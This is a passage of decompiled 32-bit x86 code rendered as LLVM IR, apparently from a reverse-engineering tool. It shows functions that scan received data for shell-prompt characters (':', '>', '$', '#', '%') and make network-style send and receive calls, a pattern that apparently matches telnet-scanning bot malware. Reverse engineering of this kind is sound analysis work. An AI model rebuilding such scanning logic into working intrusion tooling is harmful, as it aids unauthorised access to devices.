  %v1_804f2fb = add i32 %v0_804f2fb, 4
  %v2_804f2fb = inttoptr i32 %v1_804f2fb to i32*
  %v3_804f2fb = load i32, i32* %v2_804f2fb, align 4
  store i32 %v3_804f2fb, i32* @ebx, align 4
  %v2_804f2fe = add i32 %v0_804f2ed, -16
  %v3_804f2fe = inttoptr i32 %v2_804f2fe to i32*
  store i32 %v3_804f2fb, i32* %v3_804f2fe, align 4
  %v0_804f2ff = call i32 @function_8051696()
  store i32 %v0_804f2ff, i32* %eax.global-to-local, align 4
  %v0_804f304 = load i32, i32* @esp, align 4
  %v1_804f307 = add i32 %v0_804f304, 28
  %v2_804f307 = inttoptr i32 %v1_804f307 to i32*
  store i32 16384, i32* %v2_804f307, align 4
  %v1_804f30c = add i32 %v0_804f304, 24
  %v2_804f30c = inttoptr i32 %v1_804f30c to i32*
  store i32 2, i32* %v2_804f30c, align 4
  %v1_804f30e = add i32 %v0_804f304, 20
  %v2_804f30e = inttoptr i32 %v1_804f30e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80538ed.25 to i32), i32* %v2_804f30e, align 4
  %v0_804f313 = load i32, i32* @edi, align 4
  %v1_804f313 = add i32 %v0_804f313, 4
  %v2_804f313 = inttoptr i32 %v1_804f313 to i32*
  %v3_804f313 = load i32, i32* %v2_804f313, align 4
  store i32 %v3_804f313, i32* %ecx.global-to-local, align 4
  %v2_804f316 = add i32 %v0_804f304, 16
  %v3_804f316 = inttoptr i32 %v2_804f316 to i32*
  store i32 %v3_804f313, i32* %v3_804f316, align 4
  %v0_804f317 = call i32 @function_8051696()
  store i32 %v0_804f317, i32* %eax.global-to-local, align 4
  %v0_804f31c = load i32, i32* @esp, align 4
  %v1_804f31c = inttoptr i32 %v0_804f31c to i32*
  store i32 6, i32* %v1_804f31c, align 4
  %v0_804f323 = call i32 @function_80503f0()
  store i32 %v0_804f323, i32* %eax.global-to-local, align 4
  %v0_804f32b = load i32, i32* @edi, align 4
  %v1_804f32b = add i32 %v0_804f32b, 12
  %v2_804f32b = inttoptr i32 %v1_804f32b to i32*
  store i32 7, i32* %v2_804f32b, align 4
  br label %dec_label_pc_804f4f9

dec_label_pc_804f337:                             ; preds = %dec_label_pc_804f14c
  %v1_804f337 = add i32 %v0_804f14c, 24
  %v2_804f337 = inttoptr i32 %v1_804f337 to i32*
  %v3_804f337 = load i32, i32* %v2_804f337, align 4
  %v1_804f33a = add i32 %v3_804f337, -1
  store i32 %v1_804f33a, i32* %eax.global-to-local, align 4
  %tmp178 = icmp slt i32 %v1_804f33a, 1
  br i1 %tmp178, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f343

dec_label_pc_804f343:                             ; preds = %dec_label_pc_804f337
  %v2_804f343 = add i32 %v0_804f14c, 27
  %v3_804f343 = add i32 %v2_804f343, %v3_804f337
  %v4_804f343 = inttoptr i32 %v3_804f343 to i8*
  %v5_804f343 = load i8, i8* %v4_804f343, align 1
  %v6_804f343 = zext i8 %v5_804f343 to i32
  %v7_804f343 = load i32, i32* @edx, align 4
  %v8_804f343 = and i32 %v7_804f343, -256
  %v9_804f343 = or i32 %v8_804f343, %v6_804f343
  store i32 %v9_804f343, i32* %edx.global-to-local, align 4
  switch i8 %v5_804f343, label %dec_label_pc_804f351 [
    i8 62, label %dec_label_pc_804f375.thread
    i8 58, label %dec_label_pc_804f375.thread
  ]

dec_label_pc_804f351:                             ; preds = %dec_label_pc_804f343, %dec_label_pc_804f367
  %v0_804f360 = phi i32 [ %v1_804f360, %dec_label_pc_804f367 ], [ %v1_804f33a, %dec_label_pc_804f343 ]
  %v7_804f367 = phi i32 [ %v9_804f367, %dec_label_pc_804f367 ], [ %v9_804f343, %dec_label_pc_804f343 ]
  %v1_804f351 = trunc i32 %v7_804f367 to i8
  %v1_804f351.off = add i8 %v1_804f351, -35
  %switch451 = icmp ult i8 %v1_804f351.off, 3
  br i1 %switch451, label %dec_label_pc_804f375, label %dec_label_pc_804f360

dec_label_pc_804f360:                             ; preds = %dec_label_pc_804f351
  %v1_804f360 = add i32 %v0_804f360, -1
  %v8_804f360 = icmp eq i32 %v1_804f360, 0
  store i32 %v1_804f360, i32* %eax.global-to-local, align 4
  br i1 %v8_804f360, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f367

dec_label_pc_804f367:                             ; preds = %dec_label_pc_804f360
  %v3_804f367 = add i32 %v2_804f343, %v0_804f360
  %v4_804f367 = inttoptr i32 %v3_804f367 to i8*
  %v5_804f367 = load i8, i8* %v4_804f367, align 1
  %v6_804f367 = zext i8 %v5_804f367 to i32
  %v8_804f367 = and i32 %v7_804f367, -256
  %v9_804f367 = or i32 %v6_804f367, %v8_804f367
  store i32 %v9_804f367, i32* %edx.global-to-local, align 4
  %v10_804f36b = icmp ne i8 %v5_804f367, 58
  %v10_804f370 = icmp eq i8 %v5_804f367, 62
  %v1_804f373 = icmp eq i1 %v10_804f370, false
  %or.cond277 = and i1 %v10_804f36b, %v1_804f373
  br i1 %or.cond277, label %dec_label_pc_804f351, label %dec_label_pc_804f375

dec_label_pc_804f375.thread:                      ; preds = %dec_label_pc_804f343, %dec_label_pc_804f343
  store i32 %v3_804f337, i32* @ebp, align 4
  br label %dec_label_pc_804f381

dec_label_pc_804f375:                             ; preds = %dec_label_pc_804f351, %dec_label_pc_804f367
  %v0_804f375 = phi i32 [ %v1_804f360, %dec_label_pc_804f367 ], [ %v0_804f360, %dec_label_pc_804f351 ]
  %v1_804f375 = add i32 %v0_804f375, 1
  store i32 %v1_804f375, i32* @ebp, align 4
  %v10_804f378 = icmp eq i32 %v0_804f375, -2
  br i1 %v10_804f378, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f381

dec_label_pc_804f381:                             ; preds = %dec_label_pc_804f375.thread, %dec_label_pc_804f375
  %v1_804f375483 = phi i32 [ %v3_804f337, %dec_label_pc_804f375.thread ], [ %v1_804f375, %dec_label_pc_804f375 ]
  %tmp179 = icmp slt i32 %v1_804f375483, 1
  br i1 %tmp179, label %dec_label_pc_804f56b, label %dec_label_pc_804f389

dec_label_pc_804f389:                             ; preds = %dec_label_pc_804f381
  %v0_804f389 = load i32, i32* @esp, align 4
  %v1_804f38c = add i32 %v0_804f389, -16
  %v2_804f38c = inttoptr i32 %v1_804f38c to i32*
  store i32 4, i32* %v2_804f38c, align 4
  %v0_804f38e = call i32 @function_8050470()
  store i32 %v0_804f38e, i32* %eax.global-to-local, align 4
  %v0_804f393 = load i32, i32* @esp, align 4
  %v1_804f393 = inttoptr i32 %v0_804f393 to i32*
  %v2_804f393 = load i32, i32* %v1_804f393, align 4
  store i32 %v2_804f393, i32* %eax.global-to-local, align 4
  %v3_804f393 = add i32 %v0_804f393, 4
  %v1_804f394 = inttoptr i32 %v3_804f393 to i32*
  %v2_804f394 = load i32, i32* %v1_804f394, align 4
  store i32 %v2_804f394, i32* %edx.global-to-local, align 4
  %v1_804f395 = add i32 %v0_804f393, 1936
  store i32 %v1_804f395, i32* %eax.global-to-local, align 4
  store i32 %v1_804f395, i32* %v1_804f394, align 4
  store i32 4, i32* %v1_804f393, align 4
  %v0_804f39f = call i32 @function_80503c0()
  store i32 %v0_804f39f, i32* %eax.global-to-local, align 4
  %v0_804f3a4 = load i32, i32* @esp, align 4
  %v1_804f3a4 = add i32 %v0_804f3a4, -4
  %v2_804f3a4 = inttoptr i32 %v1_804f3a4 to i32*
  store i32 16384, i32* %v2_804f3a4, align 4
  %v1_804f3a9 = add i32 %v0_804f3a4, 1936
  %v2_804f3a9 = inttoptr i32 %v1_804f3a9 to i32*
  %v3_804f3a9 = load i32, i32* %v2_804f3a9, align 4
  store i32 %v3_804f3a9, i32* @esi, align 4
  %v2_804f3b0 = add i32 %v0_804f3a4, -8
  %v3_804f3b0 = inttoptr i32 %v2_804f3b0 to i32*
  store i32 %v3_804f3a9, i32* %v3_804f3b0, align 4
  %v2_804f3b1 = add i32 %v0_804f3a4, -12
  %v3_804f3b1 = inttoptr i32 %v2_804f3b1 to i32*
  store i32 %v0_804f39f, i32* %v3_804f3b1, align 4
  %v0_804f3b2 = load i32, i32* @edi, align 4
  %v1_804f3b2 = add i32 %v0_804f3b2, 4
  %v2_804f3b2 = inttoptr i32 %v1_804f3b2 to i32*
  %v3_804f3b2 = load i32, i32* %v2_804f3b2, align 4
  store i32 %v3_804f3b2, i32* @ebx, align 4
  %v2_804f3b5 = add i32 %v0_804f3a4, -16
  %v3_804f3b5 = inttoptr i32 %v2_804f3b5 to i32*
  store i32 %v3_804f3b2, i32* %v3_804f3b5, align 4
  %v0_804f3b6 = call i32 @function_8051696()
  store i32 %v0_804f3b6, i32* %eax.global-to-local, align 4
  %v0_804f3bb = load i32, i32* @esp, align 4
  %v1_804f3be = add i32 %v0_804f3bb, 28
  %v2_804f3be = inttoptr i32 %v1_804f3be to i32*
  store i32 16384, i32* %v2_804f3be, align 4
  %v1_804f3c3 = add i32 %v0_804f3bb, 24
  %v2_804f3c3 = inttoptr i32 %v1_804f3c3 to i32*
  store i32 2, i32* %v2_804f3c3, align 4
  %v1_804f3c5 = add i32 %v0_804f3bb, 20
  %v2_804f3c5 = inttoptr i32 %v1_804f3c5 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80538ed.25 to i32), i32* %v2_804f3c5, align 4
  %v0_804f3ca = load i32, i32* @edi, align 4
  %v1_804f3ca = add i32 %v0_804f3ca, 4
  %v2_804f3ca = inttoptr i32 %v1_804f3ca to i32*
  %v3_804f3ca = load i32, i32* %v2_804f3ca, align 4
  store i32 %v3_804f3ca, i32* %ecx.global-to-local, align 4
  %v2_804f3cd = add i32 %v0_804f3bb, 16
  %v3_804f3cd = inttoptr i32 %v2_804f3cd to i32*
  store i32 %v3_804f3ca, i32* %v3_804f3cd, align 4
  %v0_804f3ce = call i32 @function_8051696()
  store i32 %v0_804f3ce, i32* %eax.global-to-local, align 4
  %v0_804f3d3 = load i32, i32* @esp, align 4
  %v1_804f3d3 = inttoptr i32 %v0_804f3d3 to i32*
  store i32 4, i32* %v1_804f3d3, align 4
  %v0_804f3da = call i32 @function_80503f0()
  store i32 %v0_804f3da, i32* %eax.global-to-local, align 4
  %v0_804f3e2 = load i32, i32* @edi, align 4
  %v1_804f3e2 = add i32 %v0_804f3e2, 12
  %v2_804f3e2 = inttoptr i32 %v1_804f3e2 to i32*
  store i32 8, i32* %v2_804f3e2, align 4
  br label %dec_label_pc_804f4f9

dec_label_pc_804f3ee:                             ; preds = %dec_label_pc_804f14c
  %v1_804f3ee = add i32 %v0_804f14c, 24
  %v2_804f3ee = inttoptr i32 %v1_804f3ee to i32*
  %v3_804f3ee = load i32, i32* %v2_804f3ee, align 4
  %v1_804f3f1 = add i32 %v3_804f3ee, -1
  store i32 %v1_804f3f1, i32* %eax.global-to-local, align 4
  %tmp180 = icmp slt i32 %v1_804f3f1, 1
  br i1 %tmp180, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f3fa.preheader

dec_label_pc_804f3fa.preheader:                   ; preds = %dec_label_pc_804f3ee
  %v7_804f3fa.pre = load i32, i32* @edx, align 4
  %v2_804f3fa = add i32 %v0_804f14c, 28
  br label %dec_label_pc_804f3fa

dec_label_pc_804f3fa:                             ; preds = %dec_label_pc_804f3fa.preheader, %dec_label_pc_804f42b
  %v7_804f3fa = phi i32 [ %v7_804f3fa.pre, %dec_label_pc_804f3fa.preheader ], [ %v9_804f3fa, %dec_label_pc_804f42b ]
  %v0_804f722 = phi i32 [ %v1_804f3f1, %dec_label_pc_804f3fa.preheader ], [ %v1_804f42b, %dec_label_pc_804f42b ]
  %v3_804f3fa = add i32 %v2_804f3fa, %v0_804f722
  %v4_804f3fa = inttoptr i32 %v3_804f3fa to i8*
  %v5_804f3fa = load i8, i8* %v4_804f3fa, align 1
  %v6_804f3fa = zext i8 %v5_804f3fa to i32
  %v8_804f3fa = and i32 %v7_804f3fa, -256
  %v9_804f3fa = or i32 %v6_804f3fa, %v8_804f3fa
  store i32 %v9_804f3fa, i32* %edx.global-to-local, align 4
  switch i8 %v5_804f3fa, label %dec_label_pc_804f42b [
    i8 58, label %dec_label_pc_804f722
    i8 62, label %dec_label_pc_804f722
    i8 36, label %dec_label_pc_804f722
    i8 35, label %dec_label_pc_804f722
    i8 37, label %dec_label_pc_804f722
  ]

dec_label_pc_804f42b:                             ; preds = %dec_label_pc_804f3fa
  %v1_804f42b = add i32 %v0_804f722, -1
  %v8_804f42b = icmp eq i32 %v1_804f42b, 0
  store i32 %v1_804f42b, i32* %eax.global-to-local, align 4
  %v1_804f42c = icmp eq i1 %v8_804f42b, false
  br i1 %v1_804f42c, label %dec_label_pc_804f3fa, label %dec_label_pc_804f0d6.backedge

dec_label_pc_804f433:                             ; preds = %dec_label_pc_804f14c
  %v1_804f433 = add i32 %v0_804f14c, 24
  %v2_804f433 = inttoptr i32 %v1_804f433 to i32*
  %v3_804f433 = load i32, i32* %v2_804f433, align 4
  %v1_804f436 = add i32 %v3_804f433, -1
  store i32 %v1_804f436, i32* %eax.global-to-local, align 4
  %tmp181 = icmp slt i32 %v1_804f436, 1
  br i1 %tmp181, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f43f.preheader

dec_label_pc_804f43f.preheader:                   ; preds = %dec_label_pc_804f433
  %v7_804f43f.pre = load i32, i32* @edx, align 4
  %v2_804f43f = add i32 %v0_804f14c, 28
  br label %dec_label_pc_804f43f

dec_label_pc_804f43f:                             ; preds = %dec_label_pc_804f43f.preheader, %dec_label_pc_804f470
  %v7_804f43f = phi i32 [ %v7_804f43f.pre, %dec_label_pc_804f43f.preheader ], [ %v9_804f43f, %dec_label_pc_804f470 ]
  %v0_804f6a9 = phi i32 [ %v1_804f436, %dec_label_pc_804f43f.preheader ], [ %v1_804f470, %dec_label_pc_804f470 ]
  %v3_804f43f = add i32 %v2_804f43f, %v0_804f6a9
  %v4_804f43f = inttoptr i32 %v3_804f43f to i8*
  %v5_804f43f = load i8, i8* %v4_804f43f, align 1
  %v6_804f43f = zext i8 %v5_804f43f to i32
  %v8_804f43f = and i32 %v7_804f43f, -256
  %v9_804f43f = or i32 %v6_804f43f, %v8_804f43f
  store i32 %v9_804f43f, i32* %edx.global-to-local, align 4
  switch i8 %v5_804f43f, label %dec_label_pc_804f470 [
    i8 58, label %dec_label_pc_804f6a9
    i8 62, label %dec_label_pc_804f6a9
    i8 36, label %dec_label_pc_804f6a9
    i8 35, label %dec_label_pc_804f6a9
    i8 37, label %dec_label_pc_804f6a9
  ]

dec_label_pc_804f470:                             ; preds = %dec_label_pc_804f43f
  %v1_804f470 = add i32 %v0_804f6a9, -1
  %v8_804f470 = icmp eq i32 %v1_804f470, 0
  store i32 %v1_804f470, i32* %eax.global-to-local, align 4
  %v1_804f471 = icmp eq i1 %v8_804f470, false
  br i1 %v1_804f471, label %dec_label_pc_804f43f, label %dec_label_pc_804f0d6.backedge

dec_label_pc_804f478:                             ; preds = %dec_label_pc_804f14c
  %v0_804f478 = load i32, i32* @esp, align 4
  %v1_804f47b = add i32 %v0_804f478, -16
  %v2_804f47b = inttoptr i32 %v1_804f47b to i32*
  store i32 10, i32* %v2_804f47b, align 4
  %v0_804f47d = call i32 @function_8050470()
  store i32 %v0_804f47d, i32* %eax.global-to-local, align 4
  %v0_804f482 = load i32, i32* @esp, align 4
  %v1_804f482 = inttoptr i32 %v0_804f482 to i32*
  %v2_804f482 = load i32, i32* %v1_804f482, align 4
  store i32 %v2_804f482, i32* %eax.global-to-local, align 4
  %v3_804f482 = add i32 %v0_804f482, 4
  %v1_804f483 = inttoptr i32 %v3_804f482 to i32*
  %v2_804f483 = load i32, i32* %v1_804f483, align 4
  store i32 %v2_804f483, i32* %edx.global-to-local, align 4
  %v1_804f484 = add i32 %v0_804f482, 1928
  store i32 %v1_804f484, i32* %eax.global-to-local, align 4
  store i32 %v1_804f484, i32* %v1_804f483, align 4
  store i32 10, i32* %v1_804f482, align 4
  %v0_804f48e = call i32 @function_80503c0()
  store i32 %v0_804f48e, i32* %eax.global-to-local, align 4
  %v0_804f493 = load i32, i32* @esp, align 4
  %v1_804f493 = add i32 %v0_804f493, 1928
  %v2_804f493 = inttoptr i32 %v1_804f493 to i32*
  %v3_804f493 = load i32, i32* %v2_804f493, align 4
  %v1_804f49a = add i32 %v3_804f493, -1
  store i32 %v1_804f49a, i32* %edx.global-to-local, align 4
  %v2_804f49b = add i32 %v0_804f493, -4
  %v3_804f49b = inttoptr i32 %v2_804f49b to i32*
  store i32 %v1_804f49a, i32* %v3_804f49b, align 4
  %v2_804f49c = add i32 %v0_804f493, -8
  %v3_804f49c = inttoptr i32 %v2_804f49c to i32*
  store i32 %v0_804f48e, i32* %v3_804f49c, align 4
  %v0_804f49d = load i32, i32* @edi, align 4
  %v1_804f49d = add i32 %v0_804f49d, 24
  %v2_804f49d = inttoptr i32 %v1_804f49d to i32*
  %v3_804f49d = load i32, i32* %v2_804f49d, align 4
  store i32 %v3_804f49d, i32* %eax.global-to-local, align 4
  %v2_804f4a0 = add i32 %v0_804f493, -12
  %v3_804f4a0 = inttoptr i32 %v2_804f4a0 to i32*
  store i32 %v3_804f49d, i32* %v3_804f4a0, align 4
  %v1_804f4a1 = add i32 %v0_804f493, 28
  %v2_804f4a1 = inttoptr i32 %v1_804f4a1 to i32*
  %v3_804f4a1 = load i32, i32* %v2_804f4a1, align 4
  store i32 %v3_804f4a1, i32* %eax.global-to-local, align 4
  %v2_804f4a5 = add i32 %v0_804f493, -16
  %v3_804f4a5 = inttoptr i32 %v2_804f4a5 to i32*
  store i32 %v3_804f4a1, i32* %v3_804f4a5, align 4
  %v0_804f4a6 = call i32 @function_8050af0()
  %v0_804f4ab = load i32, i32* @esp, align 4
  %v1_804f4ae = add i32 %v0_804f4a6, 1
  %v8_804f4ae = icmp eq i32 %v1_804f4ae, 0
  store i32 %v1_804f4ae, i32* %eax.global-to-local, align 4
  %v1_804f9fc = add i32 %v0_804f4ab, 16
  %v2_804f9fc = inttoptr i32 %v1_804f9fc to i32*
  store i32 10, i32* %v2_804f9fc, align 4
  %v0_804f9fe = call i32 @function_80503f0()
  store i32 %v0_804f9fe, i32* %eax.global-to-local, align 4
  %v0_804fa03 = load i32, i32* @esp, align 4
  %v1_804fa03 = inttoptr i32 %v0_804fa03 to i32*
  br i1 %v8_804f4ae, label %dec_label_pc_804f9f9, label %dec_label_pc_804f4b5

dec_label_pc_804f4b5:                             ; preds = %dec_label_pc_804f478
  %v2_804f4bf = load i32, i32* %v1_804fa03, align 4
  store i32 %v2_804f4bf, i32* %eax.global-to-local, align 4
  %v0_804f4c0 = load i32, i32* @edi, align 4
  %v1_804f4c0 = add i32 %v0_804f4c0, 4
  %v2_804f4c0 = inttoptr i32 %v1_804f4c0 to i32*
  %v3_804f4c0 = load i32, i32* %v2_804f4c0, align 4
  store i32 %v3_804f4c0, i32* %eax.global-to-local, align 4
  store i32 %v3_804f4c0, i32* %v1_804fa03, align 4
  %v1_804f4c4 = call i32 @function_8050f63(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804f4c4, i32* %eax.global-to-local, align 4
  %v0_804f4c9 = load i32, i32* @edi, align 4
  %v1_804f4c9 = add i32 %v0_804f4c9, 284
  %v2_804f4c9 = inttoptr i32 %v1_804f4c9 to i8*
  %v3_804f4c9 = load i8, i8* %v2_804f4c9, align 1
  %v4_804f4c9 = zext i8 %v3_804f4c9 to i32
  %v6_804f4c9 = and i32 %v1_804f4c4, -256
  %v7_804f4c9 = or i32 %v4_804f4c9, %v6_804f4c9
  %v1_804f4d2 = add i32 %v7_804f4c9, 1
  store i32 %v1_804f4d2, i32* %eax.global-to-local, align 4
  %v1_804f4d3 = add i32 %v0_804f4c9, 4
  %v2_804f4d3 = inttoptr i32 %v1_804f4d3 to i32*
  store i32 -1, i32* %v2_804f4d3, align 4
  %v0_804f4da = load i32, i32* %eax.global-to-local, align 4
  %v1_804f4da = trunc i32 %v0_804f4da to i8
  %v2_804f4da = load i32, i32* @edi, align 4
  %v3_804f4da = add i32 %v2_804f4da, 284
  %v4_804f4da = inttoptr i32 %v3_804f4da to i8*
  store i8 %v1_804f4da, i8* %v4_804f4da, align 1
  %v0_804f4e0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f4e0 = trunc i32 %v0_804f4e0 to i8
  %v10_804f4e0 = icmp eq i8 %v1_804f4e0, 10
  %v1_804f4e2 = icmp eq i1 %v10_804f4e0, false
  %v0_804faa0 = load i32, i32* @edi, align 4
  br i1 %v1_804f4e2, label %dec_label_pc_804faa0, label %dec_label_pc_804f4e8

dec_label_pc_804f4e8:                             ; preds = %dec_label_pc_804f4b5
  %v1_804f4e8 = add i32 %v0_804faa0, 284
  %v2_804f4e8 = inttoptr i32 %v1_804f4e8 to i8*
  store i8 0, i8* %v2_804f4e8, align 1
  %v0_804f4ef = load i32, i32* @edi, align 4
  %v1_804f4ef = add i32 %v0_804f4ef, 12
  %v2_804f4ef = inttoptr i32 %v1_804f4ef to i32*
  store i32 0, i32* %v2_804f4ef, align 4
  store i32 -1, i32* @ebp, align 4
  br label %dec_label_pc_804f4f9

dec_label_pc_804f4f9:                             ; preds = %dec_label_pc_804f56b, %dec_label_pc_804f80e, %dec_label_pc_804faa0, %dec_label_pc_804fa7c, %dec_label_pc_804f6bd, %dec_label_pc_804f736, %dec_label_pc_804f389, %dec_label_pc_804f2d2, %dec_label_pc_804f860, %dec_label_pc_804f98f, %dec_label_pc_804f1e3, %dec_label_pc_804f4e8
  %v0_804f4f9 = load i32, i32* @edi, align 4
  %v1_804f4f9 = add i32 %v0_804f4f9, 24
  %v2_804f4f9 = inttoptr i32 %v1_804f4f9 to i32*
  %v3_804f4f9 = load i32, i32* %v2_804f4f9, align 4
  store i32 %v3_804f4f9, i32* @edx, align 4
  store i32 %v3_804f4f9, i32* %eax.global-to-local, align 4
  %v1_804f4fe = load i32, i32* @ebp, align 4
  %v2_804f4fe = sub i32 %v3_804f4f9, %v1_804f4fe
  %v8_804f4fe = xor i32 %v1_804f4fe, %v3_804f4f9
  %v9_804f4fe = xor i32 %v2_804f4fe, %v3_804f4f9
  %v10_804f4fe = and i32 %v9_804f4fe, %v8_804f4fe
  %v11_804f4fe = icmp slt i32 %v10_804f4fe, 0
  %v12_804f4fe = icmp eq i32 %v2_804f4fe, 0
  %v13_804f4fe = icmp slt i32 %v2_804f4fe, 0
  %v3_804f500 = icmp ne i1 %v13_804f4fe, %v11_804f4fe
  %v4_804f500 = or i1 %v12_804f4fe, %v3_804f500
  br i1 %v4_804f500, label %dec_label_pc_804f504, label %dec_label_pc_804f502

dec_label_pc_804f502:                             ; preds = %dec_label_pc_804f4f9
  store i32 %v1_804f4fe, i32* @edx, align 4
  br label %dec_label_pc_804f504

dec_label_pc_804f504:                             ; preds = %dec_label_pc_804f4f9, %dec_label_pc_804f502
  %v1_804f504 = phi i32 [ %v3_804f4f9, %dec_label_pc_804f4f9 ], [ %v1_804f4fe, %dec_label_pc_804f502 ]
  %v2_804f504 = sub i32 %v3_804f4f9, %v1_804f504
  store i32 %v2_804f504, i32* %eax.global-to-local, align 4
  store i32 %v2_804f504, i32* %v2_804f4f9, align 4
  %v0_804f509 = load i32, i32* @ebx, align 4
  %v1_804f509 = load i32, i32* @esp, align 4
  %v2_804f509 = add i32 %v1_804f509, -4
  %v3_804f509 = inttoptr i32 %v2_804f509 to i32*
  store i32 %v0_804f509, i32* %v3_804f509, align 4
  %v0_804f50a = load i32, i32* %eax.global-to-local, align 4
  %v2_804f50a = add i32 %v1_804f509, -8
  %v3_804f50a = inttoptr i32 %v2_804f50a to i32*
  store i32 %v0_804f50a, i32* %v3_804f50a, align 4
  %v1_804f50b = add i32 %v1_804f509, 12
  %v2_804f50b = inttoptr i32 %v1_804f50b to i32*
  %v3_804f50b = load i32, i32* %v2_804f50b, align 4
  %v1_804f50f = load i32, i32* @edx, align 4
  %v2_804f50f = add i32 %v1_804f50f, %v3_804f50b
  store i32 %v2_804f50f, i32* %eax.global-to-local, align 4
  %v2_804f511 = add i32 %v1_804f509, -12
  %v3_804f511 = inttoptr i32 %v2_804f511 to i32*
  store i32 %v2_804f50f, i32* %v3_804f511, align 4
  %v3_804f512 = load i32, i32* %v2_804f50b, align 4
  store i32 %v3_804f512, i32* %ecx.global-to-local, align 4
  %v2_804f516 = add i32 %v1_804f509, -16
  %v3_804f516 = inttoptr i32 %v2_804f516 to i32*
  store i32 %v3_804f512, i32* %v3_804f516, align 4
  %v4_804f517 = call i32 @function_80514c5(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804f517, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f14c

dec_label_pc_804f524:                             ; preds = %dec_label_pc_804f14c
  %v1_804f524 = add i32 %v0_804f14c, 24
  %v2_804f524 = inttoptr i32 %v1_804f524 to i32*
  %v3_804f524 = load i32, i32* %v2_804f524, align 4
  %v1_804f527 = add i32 %v3_804f524, -1
  store i32 %v1_804f527, i32* %eax.global-to-local, align 4
  %tmp182 = icmp slt i32 %v1_804f527, 1
  br i1 %tmp182, label %dec_label_pc_804f7a7, label %dec_label_pc_804f530.preheader

dec_label_pc_804f530.preheader:                   ; preds = %dec_label_pc_804f524
  %v7_804f530.pre = load i32, i32* @edx, align 4
  %v2_804f530 = add i32 %v0_804f14c, 28
  br label %dec_label_pc_804f530

dec_label_pc_804f530:                             ; preds = %dec_label_pc_804f530.preheader, %dec_label_pc_804f558
  %v7_804f530 = phi i32 [ %v7_804f530.pre, %dec_label_pc_804f530.preheader ], [ %v9_804f530, %dec_label_pc_804f558 ]
  %v0_804f79b = phi i32 [ %v1_804f527, %dec_label_pc_804f530.preheader ], [ %v1_804f558, %dec_label_pc_804f558 ]
  %v3_804f530 = add i32 %v2_804f530, %v0_804f79b
  %v4_804f530 = inttoptr i32 %v3_804f530 to i8*
  %v5_804f530 = load i8, i8* %v4_804f530, align 1
  %v6_804f530 = zext i8 %v5_804f530 to i32
  %v8_804f530 = and i32 %v7_804f530, -256
  %v9_804f530 = or i32 %v6_804f530, %v8_804f530
  store i32 %v9_804f530, i32* %edx.global-to-local, align 4
  switch i8 %v5_804f530, label %dec_label_pc_804f558 [
    i8 58, label %dec_label_pc_804f79b
    i8 62, label %dec_label_pc_804f79b
    i8 36, label %dec_label_pc_804f79b
    i8 35, label %dec_label_pc_804f79b
  ]

dec_label_pc_804f558:                             ; preds = %dec_label_pc_804f530
  %v1_804f558 = add i32 %v0_804f79b, -1
  %v8_804f558 = icmp eq i32 %v1_804f558, 0
  store i32 %v1_804f558, i32* %eax.global-to-local, align 4
  %v1_804f559 = icmp eq i1 %v8_804f558, false
  br i1 %v1_804f559, label %dec_label_pc_804f530, label %dec_label_pc_804f7a7

dec_label_pc_804f560:                             ; preds = %dec_label_pc_804f17b
  %v1_804f560 = add i32 %v0_804f169, 2
  store i32 %v1_804f560, i32* @ebx, align 4
  %v1_804f563 = add i32 %v0_804f563, 2
  store i32 %v1_804f563, i32* @ebp, align 4
  br label %dec_label_pc_804f165.backedge

dec_label_pc_804f165.backedge:                    ; preds = %dec_label_pc_804f560, %dec_label_pc_804faaf
  %v0_804f1e3152 = phi i32 [ %v0_804f1e3153, %dec_label_pc_804f560 ], [ %v0_804fae8, %dec_label_pc_804faaf ]
  %v1_804f165 = phi i32 [ %v1_804f175, %dec_label_pc_804f560 ], [ %v3_804fae8, %dec_label_pc_804faaf ]
  %v0_804f165 = phi i32 [ %v1_804f563, %dec_label_pc_804f560 ], [ %v0_804f165.pre, %dec_label_pc_804faaf ]
  %v5_804f17b137 = phi i32 [ %v7_804f17b, %dec_label_pc_804f560 ], [ %v0_804fae0, %dec_label_pc_804faaf ]
  %v0_804f16e132 = phi i32 [ %v0_804f58b, %dec_label_pc_804f560 ], [ %v1_804fae5, %dec_label_pc_804faaf ]
  %v2_804f165 = sub i32 %v0_804f165, %v1_804f165
  %v8_804f165 = xor i32 %v0_804f165, %v1_804f165
  %v9_804f165 = xor i32 %v2_804f165, %v0_804f165
  %v10_804f165 = and i32 %v9_804f165, %v8_804f165
  %v11_804f165 = icmp slt i32 %v10_804f165, 0
  %v13_804f165 = icmp slt i32 %v2_804f165, 0
  %v2_804f167 = icmp eq i1 %v13_804f165, %v11_804f165
  br i1 %v2_804f167, label %dec_label_pc_804f1db, label %dec_label_pc_804f169.preheader

dec_label_pc_804f56b:                             ; preds = %dec_label_pc_804f806, %dec_label_pc_804fa50, %dec_label_pc_804f6b5, %dec_label_pc_804f72e, %dec_label_pc_804f381, %dec_label_pc_804f2ca, %dec_label_pc_804f858, %dec_label_pc_804f987, %dec_label_pc_804f1db
  %v0_804f56b = phi i32 [ %v0_804f806, %dec_label_pc_804f806 ], [ %v0_804fa47, %dec_label_pc_804fa50 ], [ %v1_804f6a9, %dec_label_pc_804f6b5 ], [ %v1_804f722, %dec_label_pc_804f72e ], [ %v1_804f375483, %dec_label_pc_804f381 ], [ %v1_804f2be480, %dec_label_pc_804f2ca ], [ %v1_804f84c, %dec_label_pc_804f858 ], [ %v0_804f987, %dec_label_pc_804f987 ], [ %v0_804f1db, %dec_label_pc_804f1db ]
  %v1_804f56b = icmp eq i32 %v0_804f56b, 0
  %v1_804f56d = icmp eq i1 %v1_804f56b, false
  br i1 %v1_804f56d, label %dec_label_pc_804f4f9, label %dec_label_pc_804f0d6.backedge

dec_label_pc_804f574:                             ; preds = %dec_label_pc_804f195
  store i8 -4, i8* %v1_804f195, align 1
  %v0_804f577 = load i32, i32* @ebx, align 4
  %v1_804f577 = add i32 %v0_804f577, 2
  %v2_804f577 = inttoptr i32 %v1_804f577 to i8*
